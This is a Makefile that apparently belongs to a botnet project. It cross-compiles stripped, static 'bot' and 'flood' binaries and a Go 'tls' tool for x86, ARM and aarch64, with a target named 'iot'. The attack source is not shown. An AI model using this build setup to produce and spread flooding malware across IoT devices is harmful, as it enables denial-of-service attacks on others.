CXX      ?= g++
CXXFLAGS  = -Os -s -fno-exceptions -fno-rtti -ffunction-sections -fdata-sections -Wl,--gc-sections -pthread -static-libstdc++ -static-libgcc
ZIG       ?= /tmp/zig-linux-x86_64-0.13.0/zig

.PHONY: all multiarch tls iot clean

all: bot flood multiarch tls

bot: bot.cpp
	@if [ -x "$(ZIG)" ]; then \
		$(ZIG) cc -target x86_64-linux-musl -mcpu=x86_64 -static -Os -s bot.cpp -o bot; \
	else \
		$(CXX) $(CXXFLAGS) -march=x86-64 -mtune=generic -static -o bot bot.cpp; \
	fi

flood: flood.cpp
	@if [ -x "$(ZIG)" ]; then \
		$(ZIG) c++ -target x86_64-linux-musl -mcpu=x86_64 -static -Os -s -fno-exceptions -fno-rtti -pthread -DNO_SSL flood.cpp -o flood; \
	else \
		$(CXX) $(CXXFLAGS) -march=x86-64 -mtune=generic -static -DNO_SSL -o flood flood.cpp; \
	fi

multiarch:
	@if [ -x "$(ZIG)" ]; then \
		echo "[*] Building multi-arch static binaries with Zig..."; \
		$(ZIG) cc -target aarch64-linux-musl -static -Os -s bot.cpp -o bot-aarch64; \
		$(ZIG) cc -target arm-linux-musleabi -static -Os -s bot.cpp -o bot-armv7l; \
		$(ZIG) cc -target x86_64-linux-musl -static -Os -s bot.cpp -o bot-x86_64; \
		$(ZIG) cc -target x86-linux-musl -static -Os -s bot.cpp -o bot-x86; \
		$(ZIG) c++ -target aarch64-linux-musl -static -Os -s -fno-exceptions -fno-rtti -pthread -DNO_SSL flood.cpp -o flood-aarch64; \
		$(ZIG) c++ -target arm-linux-musleabihf -mcpu=cortex_a7 -static -Os -s -fno-exceptions -fno-rtti -pthread -DNO_SSL flood.cpp -o flood-armv7l; \
		$(ZIG) c++ -target x86_64-linux-musl -static -Os -s -fno-exceptions -fno-rtti -pthread -DNO_SSL flood.cpp -o flood-x86_64; \
		$(ZIG) c++ -target x86-linux-musl -static -Os -s -fno-exceptions -fno-rtti -pthread -DNO_SSL flood.cpp -o flood-x86; \
		echo "[+] Multi-arch static binaries built successfully."; \
	fi

tls:
	@if command -v go >/dev/null 2>&1; then \
		echo "[*] Building multi-arch static TLS binaries with Go..."; \
		(cd tls && \
			CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o tls tls.go && \
			CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o tls-x86_64 tls.go && \
			CGO_ENABLED=0 GOOS=linux GOARCH=arm64 go build -ldflags="-s -w" -o tls-aarch64 tls.go && \
			CGO_ENABLED=0 GOOS=linux GOARCH=arm GOARM=7 go build -ldflags="-s -w" -o tls-armv7l tls.go && \
			CGO_ENABLED=0 GOOS=linux GOARCH=386 go build -ldflags="-s -w" -o tls-x86 tls.go); \
		echo "[+] Multi-arch TLS binaries built successfully."; \
	fi

iot: bot flood

clean:
	rm -f bot flood bot-* flood-* http-* http https tls/tls-*
